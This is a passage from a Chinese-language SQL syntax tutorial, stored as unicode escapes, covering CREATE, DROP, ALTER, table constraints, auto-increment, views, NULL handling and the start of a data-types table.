BY\u547d\u4ee4\uff0c\u662f\u5c06\u4e24\u4e2a\u67e5\u8be2\u7ed3\u679c\u5408\u5728\u4e00\u8d77\u4e4b\u540e\uff0c\u518d\u8fdb\u884c\u6392\u5e8f\uff01\u7edd\u5bf9\u4e0d\u80fd\u5199\u4e24\u4e2aORDER BY\u547d\u4ee4\uff1b 10\u3001CREATE \uff081\uff09CREATE DATABASE \u8bed\u53e5\u7528\u4e8e\u521b\u5efa\u6570\u636e\u5e93\uff1b CREATE DATABASE dbname; \uff082\uff09CREATE TABLE \u8bed\u53e5\u7528\u4e8e\u521b\u5efa\u6570\u636e\u5e93\u4e2d\u7684\u8868\uff0c\u8868\u7531\u884c\u548c\u5217\u7ec4\u6210\uff0c\u6bcf\u4e2a\u8868\u90fd\u5fc5\u987b\u6709\u4e2a\u8868\u540d\uff1b CREATE TABLE table_name ( column_name1 data_type(size), column_name2 data_type(size), column_name3 data_type(size), .... ); /* column_name \u53c2\u6570\u89c4\u5b9a\u8868\u4e2d\u5217\u7684\u540d\u79f0\u3002 data_type \u53c2\u6570\u89c4\u5b9a\u5217\u7684\u6570\u636e\u7c7b\u578b\uff08\u4f8b\u5982 varchar\u3001integer\u3001decimal\u3001date \u7b49\u7b49\uff09\u3002 size \u53c2\u6570\u89c4\u5b9a\u8868\u4e2d\u5217\u7684\u6700\u5927\u957f\u5ea6\u3002 */ \uff083\uff09CREATE INDEX \u8bed\u53e5\u7528\u4e8e\u5728\u8868\u4e2d\u521b\u5efa\u7d22\u5f15\uff0c\u4ee5\u4fbf\u66f4\u52a0\u5feb\u901f\u9ad8\u6548\u5730\u67e5\u8be2\u6570\u636e\uff0c\u7528\u6237\u65e0\u6cd5\u770b\u5230\u7d22\u5f15\uff0c\u66f4\u65b0\u4e00\u4e2a\u5305\u542b\u7d22\u5f15\u7684\u8868\u9700\u8981\u6bd4\u66f4\u65b0\u4e00\u4e2a\u6ca1\u6709\u7d22\u5f15\u7684\u8868\u82b1\u8d39\u66f4\u591a\u7684\u65f6\u95f4\uff0c\u8fd9\u662f\u7531\u4e8e\u7d22\u5f15\u672c\u8eab\u4e5f\u9700\u8981\u66f4\u65b0\uff1b -- \u521b\u5efa\u7b80\u5355\u7d22\u5f15 CREATE INDEX index_name ON table_name (column_name) -- \u521b\u5efa\u552f\u4e00\u7d22\u5f15 CREATE UNIQUE INDEX index_name ON table_name (column_name) -- \u7528\u4e8e\u521b\u5efa\u7d22\u5f15\u7684\u8bed\u6cd5\u5728\u4e0d\u540c\u7684\u6570\u636e\u5e93\u4e2d\u4e0d\u4e00\u6837 11\u3001DROP \uff081\uff09DROP INDEX \u8bed\u53e5\u7528\u4e8e\u5220\u9664\u8868\u4e2d\u7684\u7d22\u5f15\uff1b -- \u7528\u4e8e MS Access \u7684 DROP INDEX \u8bed\u6cd5 DROP INDEX index_name ON table_name -- \u7528\u4e8e MS SQL Server \u7684 DROP INDEX \u8bed\u6cd5 DROP INDEX table_name.index_name -- \u7528\u4e8e DB2/Oracle \u7684 DROP INDEX \u8bed\u6cd5 DROP INDEX index_name -- \u7528\u4e8e MySQL \u7684 DROP INDEX \u8bed\u6cd5 ALTER TABLE table_name DROP INDEX index_name \uff082\uff09DROP TABLE \u8bed\u53e5\u7528\u4e8e\u5220\u9664\u8868\uff1b DROP TABLE table_name \uff083\uff09DROP DATABASE \u8bed\u53e5\u7528\u4e8e\u5220\u9664\u6570\u636e\u5e93\uff1b DROP DATABASE database_name \uff084\uff09\u4ec5\u4ec5\u9700\u8981\u5220\u9664\u8868\u5185\u7684\u6570\u636e\uff0c\u4f46\u5e76\u4e0d\u5220\u9664\u8868\u672c\u8eab\u4f7f\u7528TRUNCATE TABLE \u8bed\u53e5\uff1b TRUNCATE TABLE table_name 12\u3001ALTER ALTER TABLE \u8bed\u53e5\u7528\u4e8e\u5728\u5df2\u6709\u7684\u8868\u4e2d\u6dfb\u52a0\u3001\u5220\u9664\u6216\u4fee\u6539\u5217\u3002 \uff081\uff09\u6dfb\u52a0\u5217\uff1b ALTER TABLE table_name ADD column_name datatype \uff082\uff09\u5220\u9664\u5217\uff1b ALTER TABLE table_name DROP COLUMN column_name \uff083\uff09\u4fee\u6539\u5217\uff1b -- SQL Server / MS Access ALTER TABLE table_name ALTER COLUMN column_name datatype -- My SQL / Oracle ALTER TABLE table_name MODIFY COLUMN column_name datatype -- Oracle 10G \u4e4b\u540e\u7248\u672c ALTER TABLE table_name MODIFY column_name datatype \uff084\uff09\u66f4\u6539\u5217\u540d\u548c\u5c5e\u6027 ALTER TABLE table_name change column_name column_name datatype 13\u3001\u7ea6\u675f \uff081\uff09SQL \u7ea6\u675f\u7528\u4e8e\u89c4\u5b9a\u8868\u4e2d\u7684\u6570\u636e\u89c4\u5219\uff0c\u5982\u679c\u5b58\u5728\u8fdd\u53cd\u7ea6\u675f\u7684\u6570\u636e\u884c\u4e3a\uff0c\u884c\u4e3a\u4f1a\u88ab\u7ea6\u675f\u7ec8\u6b62\uff0c\u7ea6\u675f\u53ef\u4ee5\u5728\u521b\u5efa\u8868\u65f6\u89c4\u5b9a\uff08\u901a\u8fc7 CREATE TABLE \u8bed\u53e5\uff09\uff0c\u6216\u8005\u5728\u8868\u521b\u5efa\u4e4b\u540e\u89c4\u5b9a\uff08\u901a\u8fc7 ALTER TABLE \u8bed\u53e5\uff09\uff1b CREATE TABLE table_name ( column_name1 data_type(size) constraint_name, column_name2 data_type(size) constraint_name, column_name3 data_type(size) constraint_name, .... ); \uff082\uff09\u7ea6\u675f\u5206\u7c7b\uff1a NOT NULL - \u6307\u793a\u67d0\u5217\u4e0d\u80fd\u5b58\u50a8 NULL \u503c\u3002 UNIQUE - \u4fdd\u8bc1\u67d0\u5217\u7684\u6bcf\u884c\u5fc5\u987b\u6709\u552f\u4e00\u7684\u503c\u3002 PRIMARY KEY - NOT NULL \u548c UNIQUE \u7684\u7ed3\u5408\u3002\u786e\u4fdd\u67d0\u5217\uff08\u6216\u4e24\u4e2a\u5217\u591a\u4e2a\u5217\u7684\u7ed3\u5408\uff09\u6709\u552f\u4e00\u6807\u8bc6\uff0c\u6709\u52a9\u4e8e\u66f4\u5bb9\u6613\u66f4\u5feb\u901f\u5730\u627e\u5230\u8868\u4e2d\u7684\u4e00\u4e2a\u7279\u5b9a\u7684\u8bb0\u5f55\u3002 FOREIGN KEY - \u4fdd\u8bc1\u4e00\u4e2a\u8868\u4e2d\u7684\u6570\u636e\u5339\u914d\u53e6\u4e00\u4e2a\u8868\u4e2d\u7684\u503c\u7684\u53c2\u7167\u5b8c\u6574\u6027\u3002 CHECK - \u4fdd\u8bc1\u5217\u4e2d\u7684\u503c\u7b26\u5408\u6307\u5b9a\u7684\u6761\u4ef6\u3002 DEFAULT - \u89c4\u5b9a\u6ca1\u6709\u7ed9\u5217\u8d4b\u503c\u65f6\u7684\u9ed8\u8ba4\u503c\u3002 \uff083\uff09NOT NULL \u7ea6\u675f\uff0c\u5728\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u8868\u7684\u5217\u63a5\u53d7 NULL \u503c\uff0cNOT NULL \u7ea6\u675f\u5f3a\u5236\u5217\u4e0d\u63a5\u53d7 NULL \u503c\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u4e0d\u5411\u5b57\u6bb5\u6dfb\u52a0\u503c\uff0c\u5c31\u65e0\u6cd5\u63d2\u5165\u65b0\u8bb0\u5f55\u6216\u8005\u66f4\u65b0\u8bb0\u5f55\uff1b -- \u6837\u4f8b\uff0c\u521b\u5efa\u65f6\u89c4\u5b9aNOT NULL\u7ea6\u675f CREATE TABLE Persons ( ID int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255) NOT NULL, Age int ); -- \u6837\u4f8b\uff0c\u6dfb\u52a0 NOT NULL \u7ea6\u675f ALTER TABLE Persons MODIFY Age int NOT NULL; -- \u6837\u4f8b\uff0c\u5220\u9664 NOT NULL \u7ea6\u675f ALTER TABLE Persons MODIFY Age int NULL; \uff084\uff09UNIQUE \u7ea6\u675f\uff0c\u552f\u4e00\u6807\u8bc6\u6570\u636e\u5e93\u8868\u4e2d\u7684\u6bcf\u6761\u8bb0\u5f55\uff0cUNIQUE \u548c PRIMARY KEY \u7ea6\u675f\u5747\u4e3a\u5217\u6216\u5217\u96c6\u5408\u63d0\u4f9b\u4e86\u552f\u4e00\u6027\u7684\u4fdd\u8bc1\uff0cPRIMARY KEY \u7ea6\u675f\u62e5\u6709\u81ea\u52a8\u5b9a\u4e49\u7684 UNIQUE \u7ea6\u675f\uff0c\u8bf7\u6ce8\u610f\uff0c\u6bcf\u4e2a\u8868\u53ef\u4ee5\u6709\u591a\u4e2a UNIQUE \u7ea6\u675f\uff0c\u4f46\u662f\u6bcf\u4e2a\u8868\u53ea\u80fd\u6709\u4e00\u4e2a PRIMARY KEY \u7ea6\u675f\uff1b -- CREATE TABLE \u65f6\u7684 SQL UNIQUE \u7ea6\u675f -- MySQL CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), UNIQUE (P_Id) ) -- SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL UNIQUE, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u5982\u9700\u547d\u540d UNIQUE \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 UNIQUE \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName) ) -- ALTER TABLE \u65f6\u7684 SQL UNIQUE \u7ea6\u675f -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD UNIQUE (P_Id) -- \u5982\u9700\u547d\u540d UNIQUE \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 UNIQUE \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName) -- \u64a4\u9500 UNIQUE \u7ea6\u675f -- MySQL ALTER TABLE Persons DROP INDEX uc_PersonID -- SQL Server / Oracle / MS Access ALTER TABLE Persons DROP CONSTRAINT uc_PersonID -- uc_PersonID \u662f\u4e00\u4e2a\u7ea6\u675f\u540d\uff0c\u53ef\u4ee5\u81ea\u884c\u62df\u5b9a \uff085\uff09PRIMARY KEY \u7ea6\u675f\uff0c\u552f\u4e00\u6807\u8bc6\u6570\u636e\u5e93\u8868\u4e2d\u7684\u6bcf\u6761\u8bb0\u5f55\uff0c\u4e3b\u952e\u5fc5\u987b\u5305\u542b\u552f\u4e00\u7684\u503c\uff0c\u4e3b\u952e\u5217\u4e0d\u80fd\u5305\u542b NULL \u503c\uff0c\u6bcf\u4e2a\u8868\u90fd\u5e94\u8be5\u6709\u4e00\u4e2a\u4e3b\u952e\uff0c\u5e76\u4e14\u6bcf\u4e2a\u8868\u53ea\u80fd\u6709\u4e00\u4e2a\u4e3b\u952e\uff1b -- CREATE TABLE \u65f6\u7684 SQL PRIMARY KEY \u7ea6\u675f -- MySQL CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), PRIMARY KEY (P_Id) ) -- SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL PRIMARY KEY, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u5982\u9700\u547d\u540d PRIMARY KEY \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 PRIMARY KEY \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName) ) -- ALTER TABLE \u65f6\u7684 SQL PRIMARY KEY \u7ea6\u675f -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD PRIMARY KEY (P_Id) -- \u5982\u9700\u547d\u540d PRIMARY KEY \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 PRIMARY KEY \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD CONSTRAINT pk_PersonID PRIMARY KEY (P_Id,LastName) -- \u5982\u679c\u4f7f\u7528 ALTER TABLE \u8bed\u53e5\u6dfb\u52a0\u4e3b\u952e\uff0c\u5fc5\u987b\u628a\u4e3b\u952e\u5217\u58f0\u660e\u4e3a\u4e0d\u5305\u542b NULL \u503c\uff08\u5728\u8868\u9996\u6b21\u521b\u5efa\u65f6\uff09 -- \u64a4\u9500 PRIMARY KEY \u7ea6\u675f -- MySQL ALTER TABLE Persons DROP PRIMARY KEY -- SQL Server / Oracle / MS Access ALTER TABLE Persons DROP CONSTRAINT pk_PersonID \uff086\uff09FOREIGN KEY \u7ea6\u675f\uff0c\u6307\u5411\u53e6\u4e00\u4e2a\u8868\u4e2d\u7684 UNIQUE KEY(\u552f\u4e00\u7ea6\u675f\u7684\u952e)\uff0c\u7528\u4e8e\u9884\u9632\u7834\u574f\u8868\u4e4b\u95f4\u8fde\u63a5\u7684\u884c\u4e3a\uff0c\u4e5f\u80fd\u9632\u6b62\u975e\u6cd5\u6570\u636e\u63d2\u5165\u5916\u952e\u5217\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b\u662f\u5b83\u6307\u5411\u7684\u90a3\u4e2a\u8868\u4e2d\u7684\u503c\u4e4b\u4e00\uff1b -- CREATE TABLE \u65f6\u7684 SQL FOREIGN KEY \u7ea6\u675f -- MySQL CREATE TABLE Orders ( O_Id int NOT NULL, OrderNo int NOT NULL, P_Id int, PRIMARY KEY (O_Id), FOREIGN KEY (P_Id) REFERENCES Persons(P_Id) ) -- SQL Server / Oracle / MS Access CREATE TABLE Orders ( O_Id int NOT NULL PRIMARY KEY, OrderNo int NOT NULL, P_Id int FOREIGN KEY REFERENCES Persons(P_Id) ) -- \u5982\u9700\u547d\u540d FOREIGN KEY \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 FOREIGN KEY \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access CREATE TABLE Orders ( O_Id int NOT NULL, OrderNo int NOT NULL, P_Id int, PRIMARY KEY (O_Id), CONSTRAINT fk_PerOrders FOREIGN KEY (P_Id) REFERENCES Persons(P_Id) ) -- ALTER TABLE \u65f6\u7684 SQL FOREIGN KEY \u7ea6\u675f -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Orders ADD FOREIGN KEY (P_Id) REFERENCES Persons(P_Id) -- \u5982\u9700\u547d\u540d FOREIGN KEY \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 FOREIGN KEY \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Orders ADD CONSTRAINT fk_PerOrders FOREIGN KEY (P_Id) REFERENCES Persons(P_Id) -- \u64a4\u9500 FOREIGN KEY \u7ea6\u675f -- MySQL ALTER TABLE Orders DROP FOREIGN KEY fk_PerOrders -- SQL Server / Oracle / MS Access ALTER TABLE Orders DROP CONSTRAINT fk_PerOrders \uff087\uff09CHECK \u7ea6\u675f\uff0c\u7528\u4e8e\u9650\u5236\u5217\u4e2d\u7684\u503c\u7684\u8303\u56f4\uff0c\u5982\u679c\u5bf9\u5355\u4e2a\u5217\u5b9a\u4e49 CHECK \u7ea6\u675f\uff0c\u90a3\u4e48\u8be5\u5217\u53ea\u5141\u8bb8\u7279\u5b9a\u7684\u503c\uff0c\u5982\u679c\u5bf9\u4e00\u4e2a\u8868\u5b9a\u4e49 CHECK \u7ea6\u675f\uff0c\u90a3\u4e48\u6b64\u7ea6\u675f\u4f1a\u57fa\u4e8e\u884c\u4e2d\u5176\u4ed6\u5217\u7684\u503c\u5728\u7279\u5b9a\u7684\u5217\u4e2d\u5bf9\u503c\u8fdb\u884c\u9650\u5236\uff1b -- CREATE TABLE \u65f6\u7684 SQL CHECK \u7ea6\u675f -- MySQL CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CHECK (P_Id>0) ) -- SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL CHECK (P_Id>0), LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u5982\u9700\u547d\u540d CHECK \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 CHECK \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT chk_Person CHECK (P_Id>0 AND City='Sandnes') ) -- ALTER TABLE \u65f6\u7684 SQL CHECK \u7ea6\u675f -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD CHECK (P_Id>0) -- \u5982\u9700\u547d\u540d CHECK \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 CHECK \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD CONSTRAINT chk_Person CHECK (P_Id>0 AND City='Sandnes') -- \u64a4\u9500 CHECK \u7ea6\u675f -- SQL Server / Oracle / MS Access ALTER TABLE Persons DROP CONSTRAINT chk_Person -- MySQL ALTER TABLE Persons DROP CHECK chk_Person \uff088\uff09DEFAULT \u7ea6\u675f\uff0c\u7528\u4e8e\u5411\u5217\u4e2d\u63d2\u5165\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u6ca1\u6709\u89c4\u5b9a\u5176\u4ed6\u7684\u503c\uff0c\u90a3\u4e48\u4f1a\u5c06\u9ed8\u8ba4\u503c\u6dfb\u52a0\u5230\u6240\u6709\u7684\u65b0\u8bb0\u5f55\uff1b -- CREATE TABLE \u65f6\u7684 SQL DEFAULT \u7ea6\u675f -- My SQL / SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) DEFAULT 'Sandnes' ) -- ALTER TABLE \u65f6\u7684 SQL DEFAULT \u7ea6\u675f -- MySQL ALTER TABLE Persons ALTER City SET DEFAULT 'SANDNES' -- SQL Server / MS Access ALTER TABLE Persons ADD CONSTRAINT ab_c DEFAULT 'SANDNES' for City -- Oracle ALTER TABLE Persons MODIFY City DEFAULT 'SANDNES' -- \u64a4\u9500 DEFAULT \u7ea6\u675f -- MySQL ALTER TABLE Persons ALTER City DROP DEFAULT -- SQL Server / Oracle / MS Access ALTER TABLE Persons ALTER COLUMN City DROP DEFAULT \uff089\uff09Auto-increment \u4f1a\u5728\u65b0\u8bb0\u5f55\u63d2\u5165\u8868\u4e2d\u65f6\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u6570\u5b57\uff0c\u8fd9\u4e0d\u662f\u4e2a\u7ea6\u675f\uff0c\u4f46\u662f\u4f7f\u7528\u4f4d\u7f6e\u76f8\u540c\uff1b -- \u7528\u4e8e MySQL \u7684\u8bed\u6cd5 CREATE TABLE Persons ( ID int NOT NULL AUTO_INCREMENT, -- \u9ed8\u8ba4\u5f00\u59cb\u4e3a1\uff0c\u9012\u589e1\uff0c\u4e5f\u53ef\u4ee5\u89c4\u5b9a\u8d77\u59cb\u503c\uff0c\u4f8b\u5982=100 LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), PRIMARY KEY (ID) ) -- \u7528\u4e8e SQL Server \u7684\u8bed\u6cd5 CREATE TABLE Persons ( ID int IDENTITY(1,1) PRIMARY KEY, -- \u53ef\u4ee5\u5c06(1,1)\u6539\u4e3a(n,m)\uff0c\u8868\u793a\u4ee5n\u5f00\u59cb\uff0c\u9012\u589e+m LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u7528\u4e8e Access \u7684\u8bed\u6cd5 CREATE TABLE Persons ( ID Integer PRIMARY KEY AUTOINCREMENT, -- \u53ef\u4ee5\u52a0\u4e0a(n,m)\uff0c\u8868\u793a\u4ee5n\u5f00\u59cb\uff0c\u9012\u589e+m LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u7528\u4e8e Oracle \u7684\u8bed\u6cd5 CREATE SEQUENCE seq_person MINVALUE 1 START WITH 1 INCREMENT BY 1 CACHE 10 -- \u89c4\u5b9a\u4e86\u4e3a\u4e86\u63d0\u9ad8\u8bbf\u95ee\u901f\u5ea6\u8981\u5b58\u50a8\u591a\u5c11\u4e2a\u5e8f\u5217\u503c -- \u4f7f\u7528 INSERT INTO Persons (ID,FirstName,LastName) VALUES (seq_person.nextval,'Lars','Monsen') -- \u7ed9\u5df2\u7ecf\u5b58\u5728\u7684colume\u6dfb\u52a0\u81ea\u589e\u8bed\u6cd5 ALTER TABLE table_name CHANGE column_name column_name data_type(size) constraint_name AUTO_INCREMENT; -- \u4f8b\u5982 ALTER TABLE student CHANGE id id INT( 11 ) NOT NULL AUTO_INCREMENT; 14\u3001\u89c6\u56fe \u89c6\u56fe\u662f\u57fa\u4e8e SQL \u8bed\u53e5\u7684\u7ed3\u679c\u96c6\u7684\u53ef\u89c6\u5316\u7684\u8868\uff0c\u89c6\u56fe\u4e2d\u7684\u5b57\u6bb5\u5c31\u662f\u6765\u81ea\u4e00\u4e2a\u6216\u591a\u4e2a\u6570\u636e\u5e93\u4e2d\u7684\u771f\u5b9e\u7684\u8868\u4e2d\u7684\u5b57\u6bb5\uff0c\u89c6\u56fe\u9690\u85cf\u4e86\u5e95\u5c42\u7684\u8868\u7ed3\u6784\uff0c\u7b80\u5316\u4e86\u6570\u636e\u8bbf\u95ee\u64cd\u4f5c\uff0c\u52a0\u5f3a\u4e86\u5b89\u5168\u6027\uff0c\u4f7f\u7528\u6237\u53ea\u80fd\u770b\u5230\u89c6\u56fe\u6240\u663e\u793a\u7684\u6570\u636e\uff1b \uff081\uff09\u521b\u5efa\u89c6\u56fe\uff1b CREATE VIEW view_name AS SELECT column_name(s) FROM table_name WHERE condition \uff082\uff09\u66f4\u65b0\u89c6\u56fe CREATE OR REPLACE VIEW view_name AS SELECT column_name(s) FROM table_name WHERE condition -- SQL Server ALTER VIEW [ schema_name . ] view_name [ ( column [ ,...n ] ) ] [ WITH <view_attribute> [ ,...n ] ] AS select_statement [ WITH CHECK OPTION ] [ ; ] <view_attribute> ::= { [ ENCRYPTION ] [ SCHEMABINDING ] [ VIEW_METADATA ] } /* schema_name: \u89c6\u56fe\u6240\u5c5e\u67b6\u6784\u7684\u540d\u79f0\u3002 view_name: \u8981\u66f4\u6539\u7684\u89c6\u56fe\u3002 column: \u5c06\u6210\u4e3a\u6307\u5b9a\u89c6\u56fe\u7684\u4e00\u90e8\u5206\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u5217\u7684\u540d\u79f0\uff08\u4ee5\u9017\u53f7\u5206\u9694\uff09\u3002 */ \uff083\uff09\u64a4\u9500\u89c6\u56fe\uff1b DROP VIEW view_name 15\u3001NULL NULL \u503c\u4ee3\u8868\u9057\u6f0f\u7684\u672a\u77e5\u6570\u636e\uff0c\u5982\u679c\u8868\u4e2d\u7684\u67d0\u4e2a\u5217\u662f\u53ef\u9009\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u5411\u8be5\u5217\u6dfb\u52a0\u503c\u7684\u60c5\u51b5\u4e0b\u63d2\u5165\u65b0\u8bb0\u5f55\u6216\u66f4\u65b0\u5df2\u6709\u7684\u8bb0\u5f55\uff0c\u8fd9\u610f\u5473\u7740\u8be5\u5b57\u6bb5\u5c06\u4ee5 NULL \u503c\u4fdd\u5b58\uff0cNULL \u503c\u7684\u5904\u7406\u65b9\u5f0f\u4e0e\u5176\u4ed6\u503c\u4e0d\u540c\uff0cNULL \u7528\u4f5c\u672a\u77e5\u7684\u6216\u4e0d\u9002\u7528\u7684\u503c\u7684\u5360\u4f4d\u7b26\uff0c\u65e0\u6cd5\u6bd4\u8f83 NULL \u548c 0\uff0c\u5b83\u4eec\u662f\u4e0d\u7b49\u4ef7\u7684\uff1b \uff081\uff09IS NULL\uff0c\u67e5\u627e NULL \u503c\uff1b -- \u4f8b\u5982 SELECT LastName,FirstName,Address FROM Persons WHERE Address IS NULL \uff082\uff09IS NOT NULL\uff0c\u67e5\u627e\u975eNULL \u503c\uff1b -- \u4f8b\u5982 SELECT LastName,FirstName,Address FROM Persons WHERE Address IS NOT NULL \u4e09\u3001\u6570\u636e\u7c7b\u578b 1\u3001\u901a\u7528\u6570\u636e\u7c7b\u578b \u6570\u636e\u5e93\u8868\u4e2d\u7684\u6bcf\u4e2a\u5217\u90fd\u8981\u6c42\u6709\u540d\u79f0\u548c\u6570\u636e\u7c7b\u578b\uff1b \u6570\u636e\u7c7b\u578b \u63cf\u8ff0 CHARACTER(n) \u5b57\u7b26/\u5b57\u7b26\u4e32\u3002\u56fa\u5b9a\u957f\u5ea6 n\u3002 VARCHAR(n) \u6216 CHARACTER VARYING(n) \u5b57\u7b26/\u5b57\u7b26\u4e32\u3002\u53ef\u53d8\u957f\u5ea6\u3002\u6700\u5927\u957f\u5ea6 n\u3002 BINARY(n) \u4e8c\u8fdb\u5236\u4e32\u3002\u56fa\u5b9a\u957f\u5ea6 n\u3002 BOOLEAN \u5b58\u50a8 TRUE \u6216 FALSE \u503c VARBINARY(n) \u6216 BINARY VARYING(n) \u4e8c\u8fdb\u5236\u4e32\u3002\u53ef\u53d8\u957f\u5ea6\u3002\u6700\u5927\u957f\u5ea6 n\u3002 INTEGER(p) \u6574\u6570\u503c\uff08\u6ca1\u6709\u5c0f\u6570\u70b9\uff09\u3002\u7cbe\u5ea6 p\u3002 SMALLINT \u6574\u6570\u503c\uff08\u6ca1\u6709\u5c0f\u6570\u70b9\uff09\u3002\u7cbe\u5ea6 5\u3002 INTEGER \u6574\u6570\u503c\uff08\u6ca1\u6709\u5c0f\u6570\u70b9\uff09\u3002\u7cbe\u5ea6 10\u3002 BIGINT \u6574\u6570\u503c\uff08\u6ca1\u6709\u5c0f\u6570\u70b9\uff09\u3002\u7cbe\u5ea6 19\u3002 DECIMAL(p,s) \u7cbe\u786e\u6570\u503c\uff0c\u7cbe\u5ea6 p\uff0c\u5c0f\u6570\u70b9\u540e\u4f4d\u6570 s\u3002\u4f8b\u5982\uff1adecimal(5,2) \u662f\u4e00\u4e2a\u5c0f\u6570\u70b9\u524d\u6709 3 \u4f4d\u6570\uff0c\u5c0f\u6570\u70b9\u540e\u6709 2 \u4f4d\u6570\u7684\u6570\u5b57\u3002 NUMERIC(p,s) \u7cbe\u786e\u6570\u503c\uff0c\u7cbe\u5ea6 p\uff0c\u5c0f\u6570\u70b9\u540e\u4f4d\u6570 s\u3002\uff08\u4e0e DECIMAL \u76f8\u540c\uff09 FLOAT(p) \u8fd1\u4f3c\u6570\u503c\uff0c\u5c3e\u6570\u7cbe\u5ea6 p\u3002\u4e00\u4e2a\u91c7\u7528\u4ee5 10 \u4e3a\u57fa\u6570\u7684\u6307\u6570\u8ba1\u6570\u6cd5\u7684\u6d6e\u70b9\u6570\u3002\u8be5\u7c7b\u578b\u7684 size \u53c2\u6570\u7531\u4e00\u4e2a\u6307\u5b9a\u6700\u5c0f\u7cbe\u5ea6\u7684\u5355\u4e00\u6570\u5b57\u7ec4\u6210\u3002 REAL \u8fd1\u4f3c\u6570\u503c\uff0c\u5c3e\u6570\u7cbe\u5ea6 7\u3002 FLOAT \u8fd1\u4f3c\u6570\u503c\uff0c\u5c3e\u6570\u7cbe\u5ea6 16\u3002 DOUBLE PRECISION \u8fd1\u4f3c\u6570\u503c\uff0c\u5c3e\u6570\u7cbe\u5ea6 16\u3002 DATE \u5b58\u50a8\u5e74\u3001\u6708\u3001\u65e5\u7684\u503c\u3002 TIME \u5b58\u50a8\u5c0f\u65f6\u3001\u5206\u3001\u79d2\u7684\u503c\u3002 TIMESTAMP \u5b58\u50a8\u5e74\u3001\u6708\u3001\u65e5\u3001\u5c0f\u65f6\u3001\u5206\u3001\u79d2\u7684\u503c\u3002 INTERVAL \u7531\u4e00\u4e9b\u6574\u6570\u5b57\u6bb5\u7ec4\u6210\uff0c\u4ee3\u8868\u4e00\u6bb5\u65f6\u95f4\uff0c\u53d6\u51b3\u4e8e\u533a\u95f4\u7684\u7c7b\u578b\u3002 ARRAY 